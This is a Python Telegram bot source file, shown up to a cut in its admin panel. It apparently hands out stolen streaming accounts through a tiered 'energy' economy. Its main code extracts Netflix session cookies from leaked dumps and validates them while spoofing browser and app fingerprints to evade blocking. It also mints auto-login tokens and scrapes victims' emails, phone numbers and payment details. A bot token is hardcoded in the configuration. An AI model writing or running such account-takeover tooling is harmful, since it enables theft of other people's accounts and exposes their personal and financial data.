import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ForceReply
import json
import os
import re
import random
import string
from datetime import datetime, timedelta
import logging
import zipfile
from io import BytesIO
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib.parse
import base64
import html

# ==========================================
# 🚀 THE GOD-TIER ENGINE (OPop V-GOD MAX ULTIMATE)
# ==========================================
try:
    from curl_cffi import requests as cffi_requests
    from curl_cffi.requests.exceptions import RequestException
except ImportError:
    print("\n[!] CRITICAL: You must install curl_cffi -> pip install curl_cffi")
    exit(1)

# ==========================================
# ⚙️ FULL CONFIGURATION & CREDENTIALS
# ==========================================
BOT_TOKEN = "8940643347:AAECEyhPfnykeIe6cvPyJs62skzkSsmkYt4"
ADMIN_ID = 6550747435
CHANNEL_USER = "@HOPhoxmpd"
CHANNEL_LINK = "https://t.me/HOPhoxmpd"
OWNER_USERNAME = "md9op"
SUPPORT_INSTA = "https://instagram.com/oussama._py"
BOT_USERNAME = "@NFoopbot"

telebot.logger.setLevel(logging.ERROR)
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ==========================================
# 🌟 PREMIUM EMOJI SYSTEM (THE MASTER MIX PRO)
# ==========================================
PREMIUM_EMOJI_IDS = {
    # 🎬 BRANDS (Colored)
    "🎬": "6017293875125685982",
    "🎵": "6017164819948375963",
    "🍿": "6017114968262971764",
    "💬": "5445163772706582819", 
    
    # 🌈 COLORED/ANIMATED
    "👑": "5897711166582430135",
    "⭐": "5897977042237921996",
    "⚡": "5900140601948507995", 
    "⚡️": "5900140601948507995", 
    "🌩️": "5897467513087727969", 
    "🌩": "5897467513087727969", 
    "💎": "6030811868078018748",
    "🎁": "5897824991805708757",
    "✅": "4958610528588008305", 
    "❌": "5785177332595561481", 
    "⚠️": "5897909456632552057", 
    "🔗": "5897837850937792857", 
    "🟢": "5990276318925691338", 
    "🔴": "5897916354350030123",
    "🚀": "5041796412954641308", 
    "🔥": "5897693969533376611",
    "🎲": "5897617317252045220",
    "🧧": "5785281906459283269", 
    "👨‍💻": "5262742999678329061", 
    "✉️": "5990240193955765054", 
    "🗺️": "5897967155223206185", 
    "💳": "5989793276838812063", 
    "💵": "5447453226498552490", 
    "🎥": "5897515578066737510", 
    "📺": "5447253390260207116", 
    "👀": "5445372439397691719", 
    "👥": "5445174334031166029", 
    "🔑": "5454386656628991407", 
    "⚙️": "5447611706496808621", 
    "🛑": "5258121851091043775", 
    "‼️": "5897722058619493813",
    "🛡️": "5897722058619493813", 
    "🛡": "5897722058619493813", 
    "🎉": "4958489311726011319",
    "📋": "5447421246172069841",
    "💥": "4958845510543737828",
    
    # ⚪ WHITE MINIMALIST PRO
    "📇": "5447311106030726740", 
    "🌍": "5990181988558969463", 
    "🌐": "5990181988558969463", 
    "✨": "5447479640547428304", 
    "👤": "5447311106030726740", 
    "🆔": "5447421246172069841", 
    "📢": "5447621159719827951", 
    "📌": "5447408120752013199", 
    "📁": "5447408120752013199", 
    "📈": "5445210909972655435", 
    "⏳": "5445146408153806223", 
    "🕒": "5123230779593196220", 
    "📊": "5447257461889202335", 
    "🔋": "5391118489824015979", 
    "📦": "5258056717912000584", 
    "🧳": "5118686540985271080", 
    "💡": "5447425115937602108", 
    "🎧": "5447135467638125511", 
    "🏠": "5447187153274567373", 
    "🔄": "5122933683820430249", 
    "🗑️": "5447257461889202335", 
    "📡": "5444979432710242887", 
    "📖": "5447642819239903347", 
    "🎟️": "5116093437300442328", 
    "🎟": "5116093437300442328", 
    "🛍️": "5444960062407732826", 
    "🔎": "5258396243666681152",
    "🔍": "5258396243666681152",
    "🍪": "5447479640547428304" 
}

def premium_emoji(text: str) -> str:
    if not text: return text
    result = str(text)
    for emoji_char, emoji_id in PREMIUM_EMOJI_IDS.items():
        if emoji_id:
            result = result.replace(emoji_char, f'<tg-emoji emoji-id="{emoji_id}">{emoji_char}</tg-emoji>')
    return result

_orig_send_message = bot.send_message
_orig_reply_to = bot.reply_to
_orig_edit_message_text = bot.edit_message_text
_orig_send_document = bot.send_document

def _patched_send_message(chat_id, text, *args, **kwargs):
    try: return _orig_send_message(chat_id, premium_emoji(text), *args, **kwargs)
    except Exception: return _orig_send_message(chat_id, text, *args, **kwargs)

def _patched_reply_to(message, text, *args, **kwargs):
    try: return _orig_reply_to(message, premium_emoji(text), *args, **kwargs)
    except Exception: return _orig_reply_to(message, text, *args, **kwargs)

def _patched_edit_message_text(text, *args, **kwargs):
    try: return _orig_edit_message_text(premium_emoji(text), *args, **kwargs)
    except Exception: return _orig_edit_message_text(text, *args, **kwargs)

def _patched_send_document(chat_id, data, *args, **kwargs):
    orig_caption = kwargs.get('caption', None)
    if orig_caption: kwargs['caption'] = premium_emoji(orig_caption)
    try: return _orig_send_document(chat_id, data, *args, **kwargs)
    except Exception:
        if orig_caption is not None: kwargs['caption'] = orig_caption
        return _orig_send_document(chat_id, data, *args, **kwargs)

bot.send_message = _patched_send_message
bot.reply_to = _patched_reply_to
bot.edit_message_text = _patched_edit_message_text
bot.send_document = _patched_send_document
# ==========================================

# ==========================================
# 🗄️ ULTRA-SECURE ATOMIC DATABASE & STATE
# ==========================================
DB_DIR = "database"
if not os.path.exists(DB_DIR):
    os.makedirs(DB_DIR)

STOCK_FILE = f"{DB_DIR}/opop_stock.json"
USERS_FILE = f"{DB_DIR}/opop_users.json"
KEYS_FILE = f"{DB_DIR}/opop_keys.json"
PROMO_FILE = f"{DB_DIR}/opop_promos.json"
SETTINGS_FILE = f"{DB_DIR}/opop_settings.json"

DB_LOCK = threading.RLock()
CHECKER_SESSIONS = {}
ADD_SESSIONS = {}
ANTI_SPAM = {}

# ==========================================
# 🌐 PREMIUM PROXIES INJECTION (EMPTY FOR DIRECT IP)
# ==========================================
RAW_PREMIUM_PROXIES = []
PROXIES_CACHE = []

def load_and_format_proxies():
    global PROXIES_CACHE
    formatted = []
    for raw in RAW_PREMIUM_PROXIES:
        parts = raw.split(":")
        if len(parts) == 4:
            host, port, user, pwd = parts[0], parts[1], parts[2], urllib.parse.quote(parts[3], safe='')
            formatted.append(f"http://{user}:{pwd}@{host}:{port}")
    PROXIES_CACHE = formatted

load_and_format_proxies()
BOT_START_TIME = time.time()

# ==========================================
# 💎 THE NEW ECONOMIC ENGINE (TIERS & COSTS)
# ==========================================
TIERS = {
    "Free":  {"cap": 100,  "drip_amt": 10, "drip_time": 28800, "cost_p": 50, "cost_s": 50, "cost_b": 40, "cost_dice": 30},
    "PRO":   {"cap": 200,  "drip_amt": 20, "drip_time": 21600, "cost_p": 50, "cost_s": 50, "cost_b": 40, "cost_dice": 30},
    "VIP":   {"cap": 500,  "drip_amt": 30, "drip_time": 14400, "cost_p": 40, "cost_s": 40, "cost_b": 40, "cost_dice": 20},
    "SUPER": {"cap": 1000, "drip_amt": 50, "drip_time": 7200,  "cost_p": 30, "cost_s": 30, "cost_b": 30, "cost_dice": 15}
}

HAPPY_HOUR = {
    "active": False,
    "end_time": 0
}

def is_happy_hour():
    if HAPPY_HOUR["active"] and time.time() < HAPPY_HOUR["end_time"]:
        return True
    return False

def get_costs(tier):
    t = TIERS.get(tier, TIERS["Free"])
    if is_happy_hour():
        return {"cost_p": 25, "cost_s": 25, "cost_b": 20, "cost_dice": 15}
    return {"cost_p": t["cost_p"], "cost_s": t["cost_s"], "cost_b": t["cost_b"], "cost_dice": t["cost_dice"]}

# ==========================================
# 🛠️ DATABASE HANDLERS
# ==========================================
def load_db(file_path, default_data):
    with DB_LOCK:
        if os.path.exists(file_path):
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                pass
        return default_data

def save_db(file_path, data):
    with DB_LOCK:
        tmp_path = file_path + ".tmp"
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4)
        os.replace(tmp_path, file_path)

def is_maintenance():
    settings = load_db(SETTINGS_FILE, {"maintenance": False})
    return settings.get("maintenance", False)

def init_stock():
    default_stock = {
        "Netflix": {"Premium": [], "Standard": [], "Basic": [], "Unknown": []},
        "Spotify": {"Premium": []},
        "PrimeVideo": {"Premium": []}
    }
    return load_db(STOCK_FILE, default_stock)

# ==========================================
# ⚡ SMART DRIP & AUTO-RESERVE SYNC LOGIC
# ==========================================
def process_drip(u):
    if u.get("is_admin"): return u
    now = time.time()
    tier = u.get("tier", "Free")
    t_data = TIERS.get(tier, TIERS["Free"])
    cap = t_data["cap"]
    
    reserve = u.get("reserve", 0.0)
    energy = u.get("energy", 0.0)
    if reserve > 0 and energy < cap:
        space = cap - energy
        move = min(space, reserve)
        u["energy"] = energy + move
        u["reserve"] = reserve - move

    elapsed = now - u.get("last_drip", now)
    intervals = int(elapsed / t_data["drip_time"])
    if intervals > 0:
        added = intervals * t_data["drip_amt"]
        u["energy"] = min(u.get("energy", 0) + added, cap)
        u["last_drip"] = now - (elapsed % t_data["drip_time"])
    return u

def init_user(uid, name="Unknown", username=None):
    name = html.escape(str(name))
    users = load_db(USERS_FILE, {})
    uid_str = str(uid)
    now = time.time()
    with DB_LOCK:
        if uid_str not in users:
            users[uid_str] = {
                "name": name, "username": username, "history": [], "energy": 100.0, "reserve": 0.0,
                "last_drip": now, "points": 0.0, "refs": 0, "lang": None, "tier": "Free",
                "last_bonus": 0, "is_banned": False, "last_pull_cost": 0, "last_pull_nf": None,
                "last_pull_srv": None, "is_admin": (int(uid) == ADMIN_ID), "referred_by": None,
                "ref_rewarded": False, "total_pulls": 0
            }
            save_db(USERS_FILE, users)
        else:
            updated = False
            u = users[uid_str]
            if username and username.lower() != BOT_USERNAME.lower() and u.get("username") != username:
                u["username"] = username; updated = True
            if name and name != "Unknown" and name.lower() != BOT_USERNAME.lower() and u.get("name") != name:
                u["name"] = name; updated = True
            if "total_pulls" not in u: u["total_pulls"] = u.get("total_pulls", 0); updated = True
            if "referred_by" not in u: u["referred_by"] = None; u["ref_rewarded"] = False; updated = True
            if "energy" not in u: u["energy"] = 100.0; u["reserve"] = 0.0; u["last_drip"] = now; updated = True
            users[uid_str] = process_drip(u)
            if users[uid_str] != u or updated: save_db(USERS_FILE, users)
    return users

def is_banned(uid): return load_db(USERS_FILE, {}).get(str(uid), {}).get("is_banned", False)

def check_subscription(uid):
    if int(uid) == ADMIN_ID: return True
    try:
        member = bot.get_chat_member(CHANNEL_USER, uid)
        if member.status in ['creator', 'administrator', 'member', 'restricted']:
            return True
        return False
    except Exception:
        return False

def hide_email(email):
    if not email or "@" not in email: return email
    name, domain = email.split("@", 1)
    return f"{name[:2] + '***' + name[-1] if len(name) > 3 else name[0] + '***'}@{domain}"

def get_progress_bar(count, max_val=50, style="blocks"):
    if max_val <= 0: return "□□□□□□□□□□" if style == "blocks" else "🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩"
    filled = min(10, int((count / max_val) * 10))
    return "■" * filled + "□" * (10 - filled) if style == "blocks" else "🟩" * filled + "🟥" * (10 - filled)

def auto_delete_msgs(chat_id, msg_ids):
    for mid in msg_ids:
        try: bot.delete_message(chat_id, mid)
        except Exception: pass

# ==========================================
# 🛡️ SMART PROXY CACHE & IMPERSONATION
# ==========================================
def get_random_proxy():
    if PROXIES_CACHE:
        proxy_url = random.choice(PROXIES_CACHE)
        return {"http": proxy_url, "https": proxy_url}
    return None

def get_robust_session(use_proxy=False):
    profiles = ["chrome124", "chrome120", "safari17_0", "edge122"]
    choice = random.choice(profiles)
    sess = cffi_requests.Session(impersonate=choice, timeout=30)
    
    if use_proxy:
        proxy = get_random_proxy()
        if proxy: sess.proxies = proxy
    
    if "chrome" in choice or "edge" in choice:
        ver = "124" if "124" in choice else ("122" if "edge" in choice else "120")
        ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36"
        if "edge" in choice: ua += f" Edg/{ver}.0.0.0"
        sess.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-Ch-Ua": f'"Chromium";v="{ver}", "Not-A.Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": ua
        })
    else:
        sess.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Upgrade-Insecure-Requests": "1"
        })
    return sess

# ==========================================
# 🔥 FLAWLESS SURGICAL EXTRACTOR (0 BUGS)
# ==========================================
def parse_netscape(text):
    cookies = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        parts = line.split("\t")
        if len(parts) >= 7: cookies[parts[5]] = parts[6]
    return cookies

def parse_json_cookies(text):
    try:
        data = json.loads(text)
        if isinstance(data, list): 
            return {str(c.get("name", "")): str(c.get("value", "")) for c in data if isinstance(c, dict) and "name" in c and "value" in c}
        if isinstance(data, dict): return data
    except Exception: pass
    return {}

def load_cookies(text):
    text = text.strip()
    try:
        if re.match(r'^[A-Za-z0-9+/=\s]+$', text) and len(text) > 50:
            text = base64.b64decode(text).decode('utf-8', errors='ignore')
    except: pass
    text = urllib.parse.unquote(text)

    if text.startswith("[") or text.startswith("{"):
        c = parse_json_cookies(text)
        if c and "NetflixId" in c: return c

    c = parse_netscape(text)
    if c and "NetflixId" in c: return c

    cookies = {}
    for part in re.split(r"[;\n]", text):
        part = part.strip()
        if "=" in part:
            k, _, v = part.partition("=")
            if k.strip(): cookies[k.strip()] = v.strip()
    if "NetflixId" in cookies: return cookies
    return None

def extract_netflix_tokens(file_content):
    valid_formats = []
    seen = set()

    try:
        if re.match(r'^[A-Za-z0-9+/=\s]+$', file_content) and len(file_content) > 50:
            decoded = base64.b64decode(file_content).decode('utf-8', errors='ignore')
            file_content += "\n" + decoded
    except: pass

    # 1. JSON Array 
    try:
        for match in re.finditer(r'\[\s*\{.*?\}\s*\]', file_content, re.S):
            arr = json.loads(match.group(0))
            c_dict = {str(c.get("name", "")): str(c.get("value", "")) for c in arr if isinstance(c, dict)}
            if "NetflixId" in c_dict:
                nf_val = urllib.parse.unquote(c_dict["NetflixId"].strip())
                if len(nf_val) > 15 and nf_val not in seen:
                    seen.add(nf_val)
                    sec_val = urllib.parse.unquote(c_dict.get("SecureNetflixId", "").strip())
                    valid_formats.append({"NetflixId": nf_val, "SecureNetflixId": sec_val})
    except: pass

    # 2. Netscape
    for line in file_content.splitlines():
        parts = line.split("\t")
        if len(parts) >= 7 and parts[5].strip() == "NetflixId":
            nf_val = urllib.parse.unquote(parts[6].strip())
            if len(nf_val) > 15 and nf_val not in seen:
                seen.add(nf_val)
                valid_formats.append({"NetflixId": nf_val})

    # 3. Block Parsing
    blocks = re.split(r'(?i)(?:======================|Netflix/|DETAILS|\[.*?\]-\[.*?\]|# Netscape|={10,}|\n\s*\n|\|\|\||Account Details:|🎯 HIT|RAW COOKIE|LOGIN LINKS|• Cookie:)', file_content)
    
    for block in blocks:
        nf_matches = re.finditer(r'\bNetflixId(?:=|%3D|:\s*|\s+)([^\s;\'",\n]+)', block, re.IGNORECASE)
        sec_matches = re.finditer(r'\bSecureNetflixId(?:=|%3D|:\s*|\s+)([^\s;\'",\n]+)', block, re.IGNORECASE)
        
        sec_vals = [urllib.parse.unquote(m.group(1).strip()) for m in sec_matches]
        sec_val = sec_vals[0] if sec_vals else ""

        for m in nf_matches:
            nf_val = urllib.parse.unquote(m.group(1).strip())
            if len(nf_val) > 15 and nf_val not in seen:
                seen.add(nf_val)
                valid_formats.append({"NetflixId": nf_val, "SecureNetflixId": sec_val})

    return valid_formats

def decode_js(s):
    if not s: return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s.strip()

def ext_regex(pattern, text, default=""):
    m = re.search(pattern, text, re.S)
    return m.group(1) if m else default

# ==========================================
# 🎬 THE GOD-TIER NETFLIX API SHIELD
# ==========================================
def generate_dynamic_esn():
    random_hex = "".join(random.choices(string.ascii_uppercase + string.digits, k=30))
    model = random.choice(["IPHONE14%3D3", "IPHONE15%3D2", "IPHONE14%3D5"])
    return f"NFAPPL-02-{model}-PXA-{random_hex}"

def get_dynamic_ios_headers():
    version = "17.15.0"
    ios_ver = random.choice(["17.3.1", "17.4.1", "17.5.1"])
    scale = random.choice(["2.00", "3.00"])
    return {
        "User-Agent": f"Argo/{version} (iPhone; iOS {ios_ver}; Scale/{scale})", 
        "x-netflix.request.routing": f'{{"path":"/nq/mobile/nqios/~{version}/user","control_tag":"iosui_argo"}}', 
        "x-netflix.client.appversion": version
    }

def generate_nftoken_live(netflix_id_raw, secure_netflix_id_raw=""):
    if not netflix_id_raw: return None
    netflix_id = urllib.parse.unquote(str(netflix_id_raw))
    sec_id = urllib.parse.unquote(str(secure_netflix_id_raw)) if secure_netflix_id_raw else ""
    
    for attempt in range(3):
        time.sleep(random.uniform(1.0, 2.0)) 
        use_proxy = True if PROXIES_CACHE else False
        
        headers = get_dynamic_ios_headers()
        cookie_str = f"NetflixId={netflix_id};"
        if sec_id: cookie_str += f" SecureNetflixId={sec_id};"
        headers["Cookie"] = cookie_str
        
        dynamic_params = {
            "appVersion": headers["x-netflix.client.appversion"], 
            "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true"}', 
            "device_type": "NFAPPL-02-", "esn": generate_dynamic_esn(), "idiom": "phone", 
            "iosVersion": headers["User-Agent"].split("iOS ")[1].split(";")[0],
            "modelType": "IPHONE15-2", "path": '["account","token","default"]', "responseFormat": "json"
        }
        
        robust_sess = get_robust_session(use_proxy=use_proxy)
        
        try:
            r = robust_sess.get("https://ios.prod.ftl.netflix.com/iosui/user/17.15", params=dynamic_params, headers=headers)
            if r.status_code == 200:
                tok = ((((r.json().get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}).get("token")
                if tok: return str(tok)
        except RequestException: pass
        
        time.sleep(random.uniform(0.5, 1.0))
        
        try:
            sess2 = get_robust_session(use_proxy=use_proxy)
            sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
            if sec_id: sess2.cookies.set("SecureNetflixId", sec_id, domain=".netflix.com", path="/")
            
            payload = {"operationName": "CreateAutoLoginToken", "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"}, "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}}
            r2 = sess2.post("https://android14.prod.ftl.netflix.com/graphql", json=payload, headers={"User-Agent": "com.netflix.mediaclient/63884 (Linux; U; Android 14)", "Accept": "application/json", "Content-Type": "application/json"})
            
            if r2.status_code == 200:
                tok = (r2.json().get("data") or {}).get("createAutoLoginToken")
                if tok: return str(tok)
        except RequestException: pass
        
        try:
            sess3 = get_robust_session(use_proxy=use_proxy)
            sess3.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
            r3 = sess3.get("https://www.netflix.com/tv2", allow_redirects=False)
            if r3.status_code == 302 and "nftoken=" in r3.headers.get("Location", ""):
                tok = urllib.parse.parse_qs(urllib.parse.urlparse(r3.headers["Location"]).query).get("nftoken", [None])[0]
                if tok: return str(tok)
        except RequestException: pass

    return None

def check_netflix_account(cookies):
    if not cookies or not cookies.get("NetflixId"): return None
    
    max_retries = 5 
    html = ""
    success = False
    current_url = ""

    time.sleep(random.uniform(2.0, 4.0))

    for attempt in range(max_retries):
        sess = get_robust_session(use_proxy=True if PROXIES_CACHE else False)
        
        for k, v in cookies.items():
            sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
            
        try:
            r = sess.get("https://www.netflix.com/YourAccount", allow_redirects=True, timeout=30)
            html = r.text
            current_url = r.url
            
            if r.status_code in [403, 429] or "Access Denied" in html or "ui/waf-challenge" in r.url:
                backoff_time = random.uniform(3.0, 5.0) 
                time.sleep(backoff_time)
                continue
            
            if "login" in current_url.lower() or "clearcookies" in current_url.lower():
                return None
                
            is_live = False
            if "YourAccount" in current_url or "account" in current_url.lower() or "SwitchProfile" in current_url or "browse" in current_url:
                is_live = True

            if not is_live: 
                time.sleep(random.uniform(2.0, 4.0))
                continue
            
            success = True
            break 
            
        except Exception: 
            if attempt == max_retries - 1: return None
            time.sleep(random.uniform(3.0, 5.0))
            continue
            
    if not success: return None
    if '"isPasswordResetRequired":true' in html or '"passwordResetRequired":true' in html: return None

    if "browse" in current_url or "SwitchProfile" in current_url:
        try:
            r_acc = sess.get("https://www.netflix.com/YourAccount", timeout=25)
            if "login" not in r_acc.url.lower(): html = r_acc.text
        except Exception: pass

    try:
        email = decode_js(ext_regex(r'"emailAddress":"([^"]+)"', html)) or "Unknown"
        name = decode_js(ext_regex(r'"userInfo":\{"name":"([^"]+)"', html)) or decode_js(ext_regex(r'"firstName":"([^"]+)"', html)) or "Unknown"
        cc = ext_regex(r'"countryOfSignup":"([A-Z]{2,3})"', html, "XX")
        
        plan = decode_js(ext_regex(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
        if not plan: plan = decode_js(ext_regex(r'"planName":"([^"]+)"', html))
        if not plan: plan = "Unknown"
        
        price = decode_js(ext_regex(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html)) or "N/A"
        since = decode_js(ext_regex(r'"memberSince":"([^"]+)"', html))
        if not since:
            ts_raw = ext_regex(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
            if ts_raw and ts_raw.isdigit(): since = datetime.utcfromtimestamp(int(ts_raw) / 1000).strftime("%Y-%m")
            else: since = "N/A"
                
        nextbill = decode_js(ext_regex(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html)) or "N/A"
        phone = decode_js(ext_regex(r'"phoneNumber":"([^"]*)"', html)) or "N/A"
        pv_raw = ext_regex(r'"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)', html)
        phone_verified = (pv_raw == "true")
        quality_raw = ext_regex(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html).upper()
        streams = ext_regex(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html, "N/A")
        extra = ext_regex(r'"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}', html, "0")
        
        _pm_start = html.find('"paymentMethods"')
        pm_raw = html[_pm_start:_pm_start + 3000] if _pm_start >= 0 else ""
        card_brand = ext_regex(r'"paymentOptionLogo":"([^"]+)"', pm_raw) or ext_regex(r'"type":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw) or "Unknown"
        pay_type = ext_regex(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw) or "Unknown"
        card_last4 = ext_regex(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"', pm_raw) or ext_regex(r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw) or "N/A"
        
        if pay_type.upper() in ["CC", "CREDITCARD", "CRED_CARD"]: pay_type = "CC"
        if card_brand != "Unknown" and card_brand != "N/A" and card_brand not in pay_type: final_pay = f"{pay_type} ({card_brand})"
        else: final_pay = pay_type
            
        free_trial = '"isInFreeTrial":true' in html
        profiles = list(dict.fromkeys([decode_js(p) for p in re.findall(r'"profileName":"([^"]+)"', html) if p]))
        
        lower_html = html.lower()
        hold_status = "No"
        bad_flags = [
            '"isaccountonhold":true', '"membershipstatus":"paused"', 
            '"membershipstatus":"canceled"', '"membershipstatus":"former_member"',
            '"ispasswordresetrequired":true', '"passwordresetrequired":true',
            'update payment', 'update your payment', 'update billing', 
            'update credit card', 'update card', 'update your billing',
            'fix your payment', 'fix payment', 'payment failure', 'payment_failure',
            'payment error', "didn't go through", 'retry payment', 'retry_payment',
            'paymentissue', 'payment issue', '"haspaymentissue":true', 
            '"isinfreeplay":true', 'past due', 'billing issue', 'billing error',
            'membershipstatus":"incomplete"', 'membershipstatus":"unpaid"',
            'restart your membership', 'renew your membership', 'resume your membership',
            'finish sign up', 'finish signup', 'complete your sign up',
            'payment was declined', 'payment declined', 'card was declined', 'card declined',
            'trouble with your payment', 'problem with your payment',
            'account is on hold', 'account on hold',
            '"accountstatus":"inactive"', '"status":"inactive"', '"isactive":false'
        ]
        
        if any(flag in lower_html for flag in bad_flags):
            hold_status = "Yes"
            
        if plan == "Unknown" and "current_member" not in lower_html and "membership" not in lower_html:
            hold_status = "Yes"
            
        tier = "Premium" if "PREMIUM" in plan.upper() or "UHD" in quality_raw else ("Standard" if "STANDARD" in plan.upper() or "HD" in quality_raw else "Basic")
        if plan == "Unknown": tier = "Unknown"
        
        nf_id = cookies.get("NetflixId", "")
        sec_id = cookies.get("SecureNetflixId", "")
        
        clean_cookie = f".netflix.com\tTRUE\t/\tTRUE\t2147483647\tNetflixId\t{nf_id}"
        if sec_id: clean_cookie += f"\n.netflix.com\tTRUE\t/\tTRUE\t2147483647\tSecureNetflixId\t{sec_id}"
        
        return {
            "tier": tier, "email": email, "name": name, "cc": cc, "plan": plan, "price": price, 
            "member_since": since, "next_billing": nextbill, "phone": phone, "phone_verified": phone_verified, 
            "quality": quality_raw, "streams": streams, "extra": extra, "pay_method": final_pay,
            "card_brand": card_brand, "card_last4": card_last4, "free_trial": free_trial,
            "profiles": profiles, "nf_id": nf_id, "sec_id": sec_id, "raw_clean": clean_cookie,
            "hold": hold_status
        }
    except Exception: return None

# ==========================================
# 👑 PRO ULTIMATE ADMIN PANEL (GOD MODE)
# ==========================================
@bot.message_handler(commands=['drop', 'ban', 'unban', 'addenergy', 'setenergy', 'info', 'users', 'clearstock', 'genkey', 'genpromo', 'broadcast', 'send', 'backup', 'userlist', 'find', 'reset', 'stats', 'checkstock', 'getstock', 'top', 'maintenance', 'delkey', 'happyhour', 'tier', 'addpoints', 'ping', 'purgedead'])
def admin_cmds(message):
    if message.chat.id != ADMIN_ID: return
    cmd = message.text.split()[0].lower()
    args = message.text.split()[1:]
    users = load_db(USERS_FILE, {})

    try:
        if cmd == '/ping':
            uptime_sec = int(time.time() - BOT_START_TIME)
            uptime_str = str(timedelta(seconds=uptime_sec))
            proxy_status = "🟢 Active & Loaded" if PROXIES_CACHE else "🔴 Disabled"
            msg_text = (f"📡 <b>OPOP V-GOD PING</b>\n━━━━━━━━━━━━━━━━━━\n⏳ <b>Uptime:</b> {uptime_str}\n🛡️ <b>Proxy Shield:</b> {proxy_status}\n👥 <b>Users DB:</b> {len(users)}\n━━━━━━━━━━━━━━━━━━\n⚡ <i>Powered by OPop 👑</i>")
            bot.reply_to(message, msg_text, parse_mode="HTML")

        elif cmd == '/maintenance':
            if len(args) < 1 or args[0].lower() not in ['on', 'off']: return bot.reply_to(message, "⚠️ الاستخدام: `/maintenance [on/off]`")
            state = (args[0].lower() == 'on')
            with DB_LOCK:
                sets = load_db(SETTINGS_FILE, {"maintenance": False}); sets["maintenance"] = state; save_db(SETTINGS_FILE, sets)
            bot.reply_to(message, f"⚙️ وضع الصيانة الآن: <b>{'مفعل ✅' if state else 'معطل ❌'}</b>", parse_mode="HTML")

        elif cmd == '/backup':
            sent = False
            for f_path, cap in [(USERS_FILE, "📦 Users"), (STOCK_FILE, "📦 Stock"), (KEYS_FILE, "📦 Promos"), (PROMO_FILE, "📦 Promos")]:
                if os.path.exists(f_path): 
                    try: 
                        bot.send_document(ADMIN_ID, open(f_path, 'rb'), caption=cap, timeout=60)
                        sent = True
                    except: pass
            if sent: bot.reply_to(message, "✅ <b>تم الانتهاء من النسخ الاحتياطي! الملفات أرسلت لك.</b>", parse_mode="HTML")
            else: bot.reply_to(message, "⚠️ <b>لا توجد ملفات قاعدة بيانات حالياً.</b>", parse_mode="HTML")

        elif cmd == '/users':
            banned_count = sum(1 for u in users.values() if u.get('is_banned'))
            top_users = sorted(users.items(), key=lambda x: x[1].get('total_pulls', 0), reverse=True)[:3]
            txt = f"👥 <b>إجمالي المستخدمين في النظام:</b> <code>{len(users)}</code>\n🔴 <b>محظورين:</b> {banned_count}\n\n🏆 <b>أقوى 3 مستخدمين (سحبات):</b>\n"
            for i, (u_id, u_data) in enumerate(top_users, 1):
                clean_name = str(u_data.get('name', 'Unknown')).replace('<', '').replace('>', '')
                txt += f"{i}. {clean_name} ({u_data.get('total_pulls', 0)} سحبة)\n"
            txt += "\n<blockquote>💡 للحصول على اللائحة الكاملة، أرسل /userlist</blockquote>"
            bot.reply_to(message, txt, parse_mode="HTML")

        elif cmd == '/userlist':
            out = []
            out.append("╔════════════════════════════════════════════════════╗")
            out.append("║           👑 OPOP PRO USERS DATABASE 👑            ║")
            out.append("╚════════════════════════════════════════════════════╝\n")
            for uid, u in users.items():
                uname = f"@{u['username']}" if u.get("username") else "None"
                name = str(u.get("name", "Unknown")).replace("\n", " ").replace("\r", "")
                out.append(f"📇 𝗨𝗦𝗘𝗥 𝗣𝗥𝗢𝗙𝗜𝗟𝗘: {name}")
                out.append(f"┣ 🆔 ID: {uid}")
                out.append(f"┣ 🔗 User: {uname}")
                out.append(f"┣ 👑 Tier: {u.get('tier', 'Free')}")
                out.append(f"┣ 🔋 Energy: {int(u.get('energy', 0))}⚡ | 📦 Reserve: +{int(u.get('reserve', 0))}⚡")
